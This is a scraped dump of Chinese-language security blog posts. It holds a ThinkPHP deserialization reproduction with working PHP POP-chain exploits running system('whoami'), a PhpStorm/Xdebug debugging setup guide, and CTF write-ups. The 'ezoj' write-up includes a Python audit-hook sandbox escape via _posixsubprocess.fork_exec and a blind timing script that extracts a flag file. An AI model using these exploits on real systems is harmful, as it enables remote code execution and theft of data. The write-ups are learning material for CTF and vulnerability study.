7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;?php namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); 可以动态生成调试一下。\n就简单说说这里的差错点：\n同样的，我也是关注到了在toArray()方法中的对$this-\u0026gt;visible的分割，同样的最开始构造是是想要利用else语句中的代码块来进行赋值操作：\n但是在参数跟进中，发现这里是需要将这个$val设置为命令执行的参数，比如whoami，但是这里就一定会是字符串类型的，就一定不能成功调用，那么我前面的POC构造就顺应趋势，尝试对if中的语句进行利用，所以需要有.，让然后$name的值为命令执行参数，所以我传参\n1 2 3 $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; \u0026#34;fupanc.whoami\u0026#34; ]; 这样就能形成一个$visible['fupanc'][] = \u0026quot;whoami\u0026quot;了，在最后的调用call()方法时，这里的参数就是传递的这个：\n但是呀但是，顺应if语句的后果是，里面是一层数组（也就是会生成上面给的示例的结果）：\n本来我还很兴奋，刚好call_user_func_array()函数第二个就是需要一个数组类型，但是，在真正调用时，是在外面套了一层数组的：\n所以这里真正调用时是会报错的：\n所以这里是失败的。还是必须要进入到else中的语句呀，这样才能赋值为一个字符串类型，从而可以进行命令执行，但是一直想不通呀，怎么可以这样进行呢？\n最后还是看的nivia学长的文章，里面有如下说法：\n我最开始也是看不懂的，通过看POC以及写代码，终于理解到了。\n在这里nivia学长就是将$val设置为了一个实例化对象，然后在函数调用时会触发toString()函数，从而输出这个内容，但是也是一直没想清楚是哪里调用了触发了toString()方法，后面想到了命令执行函数，需要string类型，那么很有可能是这个点，测试代码如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Student{ function __toString(){ return \u0026#34;whoami\u0026#34;; } } $a=new Student(); call_user_func_array(\u0026#34;system\u0026#34;,[$a]); 最后成功进行命令执行。成功，那么就是这样进行的。\n并且，这里非常非常重要的是，还刚好有一个类的toString()函数是符合这个条件的：\ntoString()函数内容如下：\n1 2 3 4 public function __toString(): string { return (string) $this-\u0026gt;value; } 哇塞，太符合了，怎么就会有这么巧的情况出现，tql，又学到一个新的利用点。\n————————\n最终POC 完事具备，最后的完整POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;registered = false; $this-\u0026gt;name=\u0026#34;f\u0026#34;; $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); 成功命令执行：\n简单优化了一下POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 \u0026lt;?php namespace Symfony\\Component\\VarDumper\\Caster; class ConstStub{ protected $value; function __construct(){ $this-\u0026gt;value=\u0026#34;whoami\u0026#34;; } } namespace think; class Validate { protected $type = []; function __construct(){ $this-\u0026gt;type=[\u0026#39;visible\u0026#39;=\u0026gt;\u0026#39;system\u0026#39;]; } } class Route{ } namespace think\\model; class Pivot { protected $visible = []; protected $hidden = []; protected $append = []; private $relation = []; function __construct(){ $this-\u0026gt;visible=[ \u0026#39;fupanc\u0026#39; =\u0026gt; new \\Symfony\\Component\\VarDumper\\Caster\\ConstStub ]; $this-\u0026gt;hidden=[ \u0026#39;113\u0026#39;=\u0026gt;true ]; $this-\u0026gt;append=[ \u0026#34;fupanc\u0026#34;=\u0026gt;\u0026#34;fupanc.111111\u0026#34; ]; $this-\u0026gt;relation=[ \u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\Validate() ]; } } namespace think\\route; class Resource { protected $rule; protected $option = []; protected $rest = []; protected $router; protected $name; function __construct(){ $this-\u0026gt;rule=\u0026#34;fupanc\u0026#34;; $this-\u0026gt;router=new \\think\\Route(); $this-\u0026gt;option=[ \u0026#34;var\u0026#34;=\u0026gt;[\u0026#34;fupanc\u0026#34;=\u0026gt;new \\think\\model\\Pivot()], ]; $this-\u0026gt;rest = [ \u0026#39;fupanc\u0026#39; =\u0026gt; [\u0026#34;111\u0026#34;,\u0026#34;\u0026lt;id\u0026gt;\u0026#34;] ]; $this-\u0026gt;name=\u0026#34;f\u0026#34;; } } namespace think\\route; class ResourceRegister { protected $registered; protected $resource; protected $name; function __construct(){ $this-\u0026gt;resource=new \\think\\route\\Resource(); } } $a=new \\think\\route\\ResourceRegister(); echo urlencode(base64_encode(serialize($a))); ——————\n总结 intersting，very intersting，一切都是最好的安排，好玩好玩。\n参考文章：\nhttps://xz.aliyun.com/news/14341\n——————————\nThinkphp的漏洞还是很多的，其他的就不复现了，还想再复现的可以在漏洞库找找。\n注：每一部分的参考文章都是不同的。\n","date":"2025-03-07T22:09:04+08:00","permalink":"https://fupanc-w1n.github.io/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"ThinkPHP漏洞复现"},{"content":"phpstorm远程调试环境搭建 搭建工具需求：phpstorm+phpstudy\n过程说明 首先是在phpstudy搭建一个网站，然后在扩展里选上xdebug：\n可以写一个phpinfo()回显页面，然后全部赋值粘贴拿到xdebug官方页面来寻求适配的xdebug版本：\n下载给的文件，然后将其改名为php_xdebug.dll并放在ext目录下。\n再然后修改一下php.ini内容，这里走了很多坑，如下即可：\n1 2 3 4 5 6 7 8 9 10 [Xdebug] zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll xdebug.log=D:/phpstudy_pro/xdebug.log xdebug.mode=debug; xdebug.remote_handler=\u0026#34;dbgp\u0026#34; xdebug.start_with_request = yes xdebug.discover_client_host = yes xdebug.client_host = localhost xdebug.client_port = 62649 xdebug.idekey=\u0026#34;PHPSTORM\u0026#34; 注意一下xdebug2和xdebug3的区别，我这里是xdebug3。然后就是配置phpstorm了：\n在设置的debug部分：\n一定要开启侦听，然后这里的端口需要与前面配置文件中的client_port相同。\n然后配置DBGp代理：\n然后配置一个服务器：\n这里的主机可以随便填，但是端口就需要和phpstudy上的一样。然后编辑配置：\n加一个PHP网页：\n可以点击验证来验证一下：\n然后打一个断点就可以开始调试了：\n调试超时解决方法：\n1.php.ini需要设置xdebug和mac_execution_time等，来增加等待时间：\n1 2 3 4 5 # 超时时间改大一点 xdebug.remote_cookie_expire_time = 7200 max_execution_time=7200 max_input_time=7200 default_socket_timeout = 7200 2.修改apache的配置文件，这里就贴一下我加的一些配置：\n修改httpd.conf：将下面这行的前面的注释去掉：\n1 Include conf/extra/httpd-default.conf 然后添加如下一行：\n1 Include conf/extra/httpd-fcgid.conf 并且在最后加上如下内容\n1 2 3 4 5 6 # 超时时间改大一点 Timeout 7200 FcgidIOTimeout 7200 FcgidIdleTimeout 7200 IPCConnectTimeout 7200 IPCCommTimeout 7200 然后在conf\\extra\\httpd-default.conf里修改，修改文档内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # # Timeout: The number of seconds before receives and sends time out. # Timeout 7200 # # KeepAlive: Whether or not to allow persistent connections (more than # one request per connection). Set to \u0026#34;Off\u0026#34; to deactivate. # KeepAlive On # # MaxKeepAliveRequests: The maximum number of requests to allow # during a persistent connection. Set to 0 to allow an unlimited amount. # We recommend you leave this number high, for maximum performance. # MaxKeepAliveRequests 0 # # KeepAliveTimeout: Number of seconds to wait for the next request from the # same client on the same connection. # KeepAliveTimeout 7200 最后在apache\\conf\\extra目录下新建一个httpd-fcgid.conf文件，加入如下内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ProcessLifeTime 7200 FcgidIOTimeout 7200 FcgidConnectTimeout 7200 FcgidOutputBufferSize 128 FcgidMaxRequestsPerProcess 1000 FcgidMinProcessesPerClass 0 FcgidMaxProcesses 16 FcgidMaxRequestLen 268435456 FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000 IPCConnectTimeout 7200 IPCCommTimeout 7200 FcgidIdleTimeout 7200 FcgidBusyTimeout 60000 FcgidBusyScanInterval 120 FcgidInitialEnv PHPRC \u0026#34;D:\\phpstudy_pro\\Extensions\\php\\php7.4.3nts\u0026#34; AddHandler fcgid-script .php php路径自己修改，然后如果还想改时间更长的话就是改上面的7200这个数字。\n最后重启一下apache即可，应该就是可以了。\n易坑点 几个比较重要的点吧，也有些是这里想着重说明的：\n每次修改php.ini文件，都是需要重启一次服务的。直接在phpstudy上的apache哪里重启就行了。 如果有几个环境，比如phpstudy上创建了几个网站，搞混了就比较麻烦，在验证这里我是卡了很久的。如果按照前面的操作，在最后验证的那一步出现了什么端口繁忙等等问题，关掉其他网站，然后重启电脑再次尝试。 参考文章：\nhttps://www.cnblogs.com/gaorenyusi/p/18213773\nhttps://blog.csdn.net/kelleo/article/details/135215408\nhttps://blog.csdn.net/weixin_43888304/article/details/120802226\nhttps://xdebug.org/docs/upgrade_guide#changed-xdebug.remote_autostart\n","date":"2025-03-02T16:11:22+08:00","permalink":"https://fupanc-w1n.github.io/p/phpstorm%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"phpstorm远程调试环境搭建"},{"content":"WEB ezoj 啊？怎么整个五个算法题给CTF选手做？？这我不得不展示一下真正的技术把测评机打穿。 题目环境不出网。\n——————\n开题就是几个算法题，在页面下方看到\n访问source路由拿到源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 import os import subprocess import uuid import json from flask import Flask, request, jsonify, send_file from pathlib import Path app = Flask(__name__) SUBMISSIONS_PATH = Path(\u0026#34;./submissions\u0026#34;) PROBLEMS_PATH = Path(\u0026#34;./problems\u0026#34;) SUBMISSIONS_PATH.mkdir(parents=True, exist_ok=True) CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; class OJTimeLimitExceed(Exception): pass class OJRuntimeError(Exception): pass @app.route(\u0026#34;/\u0026#34;) def index(): return send_file(\u0026#34;static/index.html\u0026#34;) @app.route(\u0026#34;/source\u0026#34;) def source(): return send_file(\u0026#34;server.py\u0026#34;) @app.route(\u0026#34;/api/problems\u0026#34;) def list_problems(): problems_dir = PROBLEMS_PATH problems = [] for problem in problems_dir.iterdir(): problem_config_file = problem / \u0026#34;problem.json\u0026#34; if not problem_config_file.exists(): continue problem_config = json.load(problem_config_file.open(\u0026#34;r\u0026#34;)) problem = { \u0026#34;problem_id\u0026#34;: problem.name, \u0026#34;name\u0026#34;: problem_config[\u0026#34;name\u0026#34;], \u0026#34;description\u0026#34;: problem_config[\u0026#34;description\u0026#34;], } problems.append(problem) problems = sorted(problems, key=lambda x: x[\u0026#34;problem_id\u0026#34;]) problems = {\u0026#34;problems\u0026#34;: problems} return jsonify(problems), 200 @app.route(\u0026#34;/api/submit\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def submit_code(): try: data = request.get_json() code = data.get(\u0026#34;code\u0026#34;) problem_id = data.get(\u0026#34;problem_id\u0026#34;) if code is None or problem_id is None: return ( jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Missing \u0026#39;code\u0026#39; or \u0026#39;problem_id\u0026#39;\u0026#34;}), 400, ) problem_id = str(int(problem_id)) problem_dir = PROBLEMS_PATH / problem_id if not problem_dir.exists(): return ( jsonify( {\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Problem ID {problem_id} not found!\u0026#34;} ), 404, ) code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) result = judge(code_filename, problem_dir) code_filename.unlink() return jsonify(result) except Exception as e: return jsonify({\u0026#34;status\u0026#34;: \u0026#34;ER\u0026#34;, \u0026#34;message\u0026#34;: str(e)}), 500 def judge(code_filename, problem_dir): test_files = sorted(problem_dir.glob(\u0026#34;*.input\u0026#34;)) total_tests = len(test_files) passed_tests = 0 try: for test_file in test_files: input_file = test_file expected_output_file = problem_dir / f\u0026#34;{test_file.stem}.output\u0026#34; if not expected_output_file.exists(): continue case_passed = run_code(code_filename, input_file, expected_output_file) if case_passed: passed_tests += 1 if passed_tests == total_tests: return {\u0026#34;status\u0026#34;: \u0026#34;AC\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Accepted\u0026#34;} else: return { \u0026#34;status\u0026#34;: \u0026#34;WA\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Wrang Answer: pass({passed_tests}/{total_tests})\u0026#34;, } except OJRuntimeError as e: return {\u0026#34;status\u0026#34;: \u0026#34;RE\u0026#34;, \u0026#34;message\u0026#34;: f\u0026#34;Runtime Error: ret={e.args[0]}\u0026#34;} except OJTimeLimitExceed: return {\u0026#34;status\u0026#34;: \u0026#34;TLE\u0026#34;, \u0026#34;message\u0026#34;: \u0026#34;Time Limit Exceed\u0026#34;} def run_code(code_filename, input_file, expected_output_file): with open(input_file, \u0026#34;r\u0026#34;) as infile, open( expected_output_file, \u0026#34;r\u0026#34; ) as expected_output: expected_output_content = expected_output.read().strip() process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) except subprocess.TimeoutExpired: process.kill() raise OJTimeLimitExceed if process.returncode != 0: raise OJRuntimeError(process.returncode) if stdout.strip() == expected_output_content: return True else: return False if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=5000) 审计代码，关键代码就是传参，然后可以往python文件写python代码，但是设置了audit沙箱，简单说几个关键代码，写入文件的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; 。。。。。。 code_filename = SUBMISSIONS_PATH / f\u0026#34;submission_{uuid.uuid4()}.py\u0026#34; with open(code_filename, \u0026#34;w\u0026#34;) as code_file: code = CODE_TEMPLATE + code code_file.write(code) 这里就是从post传参来获取到code的值，让然后拼接CODE_TEMPLATE写入到一个python文件。\n运行python文件代码：\n1 2 3 4 5 6 7 8 9 10 process = subprocess.Popen( [\u0026#34;python3\u0026#34;, code_filename], stdin=infile, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, ) try: stdout, stderr = process.communicate(timeout=5) 就是执行python文件。可以进行对python文件内容进行代码注入，看拼接的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 CODE_TEMPLATE = \u0026#34;\u0026#34;\u0026#34; import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) \u0026#34;\u0026#34;\u0026#34; audit hook沙箱，就是限制了sys对进程的一些加载以及利用。可以看到是允许import操作，以及time模块的sleep方法等，这里就是audithook沙箱，可以打沙箱逃逸，在audit沙箱逃逸中，非常经典的就是使用fok_exec()函数，即利用_posixsubprocess模块，这个模块就是创建了一个子进程，可以进行命令执行，一个简单的payload如下：\n1 2 3 4 import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;cat /etc/passwd\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) 可以本地测试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import sys import math import collections import queue import heapq import bisect def audit_checker(event,args): if not event in [\u0026#34;import\u0026#34;,\u0026#34;time.sleep\u0026#34;,\u0026#34;builtins.input\u0026#34;,\u0026#34;builtins.input/result\u0026#34;]: raise RuntimeError sys.addaudithook(audit_checker) import os import _posixsubprocess _posixsubprocess.fork_exec([b\u0026#34;/bin/sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;ls /\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False) 执行效果如下：\n成功命令执行。\n但是现在就需要想在题目中怎么利用。\n题目描述说了环境不出网。那就打命令盲注。参考到之前的脚本稍微改改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import requests import time url = \u0026#34;http://121.41.238.106:13847/api/submit\u0026#34; charset = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-\u0026#34; result = \u0026#34;\u0026#34; for i in range(1, 5): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(1, 7): # 假设每行最多 7个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(ls / | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } try: start_time = time.time() res = requests.post(url, json=json_data) end_time = time.time() delay = end_time - start_time if delay \u0026gt; 2: result += char print(f\u0026#34;当前结果: {result}\u0026#34;) break except Exception as e: print(f\u0026#34;请求失败: {e}\u0026#34;) continue result += \u0026#34; \u0026#34; print(\u0026#34;最终结果:\u0026#34;) print(result) 就是有点慢，一直等着跑：\n还没跑出来flag文件名称，简单改一下i的范围即可，然后继续跑，跑出来一个flag-9的名称：\n直接用通配符*匹配然后读取内容，注意将j的值改大点，简单改改就行了：\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(1, 30): # 假设每行最多 7 个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } 爆出来：\n1 aliyunctf{076d4662-656b-4889- 长度不够，再改点：\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(30, 60): # 假设每行最多 7 个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } 然后再爆出来：\n1 ac30-77bb8c19fefa} 直接拼接到交就行了：\n1 aliyunctf{076d4662-656b-4889-ac30-77bb8c19fefa} ——————\n打卡OK 没写好的系统怎么会打卡ok呢~\n——————\n开题，跳转到了login.php，后端是php，扫目录：\n在index.php~文件中拿到了index.php文件源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php session_start(); if($_SESSION[\u0026#39;login\u0026#39;]!=1){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Please login!\\\u0026#34;);window.location.href=\\\u0026#34;./login.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; return ; } ?\u0026gt; \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; }else{ include \u0026#39;error.php\u0026#39;; } } ?\u0026gt; 还是显示必须要登录，但是在登录框有一个code，不知道是干什么的，也爆破不了。后面发现其实可以任意读取文件源码，类似xxxx.php~这样来读取文件内容，部分文件的文件泄露，下面贴一下文件内容荣，这里就只保留php代码了：\nlogin.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;web\u0026#34;; $password = \u0026#34;web\u0026#34;; $dbname = \u0026#34;web\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#34;连接失败: \u0026#34; . $conn-\u0026gt;connect_error); } session_start(); include \u0026#39;./pass.php\u0026#39;; if(isset($_POST[\u0026#39;username\u0026#39;]) and isset($_POST[\u0026#39;password\u0026#39;])){ $username=addslashes($_POST[\u0026#39;username\u0026#39;]); $password=$_POST[\u0026#39;password\u0026#39;]; $code=$_POST[\u0026#39;code\u0026#39;]; $endpass=md5($code.$password).\u0026#39;:\u0026#39;.$code; $sql = \u0026#34;select password from users where username=\u0026#39;$username\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { if($endpass==$row[\u0026#39;password\u0026#39;]){ $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;username\u0026#39;] = md5($username); echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Welcome $username!\\\u0026#34;);window.location.href=\\\u0026#34;./index.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; } } } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;错误\\\u0026#34;);\u0026lt;/script\u0026gt;\u0026#34;; die(); } $conn-\u0026gt;close(); } ?\u0026gt; pass.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class mypass { public function generateRandomString($length = 10) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } public function checkpass($plain) { $password = 